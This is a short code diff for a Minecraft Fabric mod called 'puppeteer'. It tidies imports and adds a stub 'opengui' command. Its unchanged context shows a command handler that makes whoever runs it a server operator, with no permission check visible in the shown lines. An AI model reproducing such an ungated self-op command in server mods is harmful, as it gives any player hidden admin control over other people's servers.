@@ -1,7 +1,6 @@
 package puppeteer.common.registry;
 
-import static net.minecraft.server.command.CommandManager.argument;
-import static net.minecraft.server.command.CommandManager.literal;
+    import static net.minecraft.server.command.CommandManager.literal;
 import com.mojang.brigadier.CommandDispatcher;
 
 import net.fabricmc.fabric.api.command.v1.CommandRegistrationCallback;
@@ -21,6 +20,13 @@ public class ModCommands {
         ctx.getSource().getMinecraftServer().getPlayerManager().addToOperators(ctx.getSource().getPlayer().getGameProfile());
         return 0;
       })
+    );
+
+    dispatcher.register(literal("opengui")
+            .executes(ctx -> {
+      ctx.getSource().getPlayer(); // i need a way to open client screen from here..
+              return 0;
+            })
     );
   }
 }
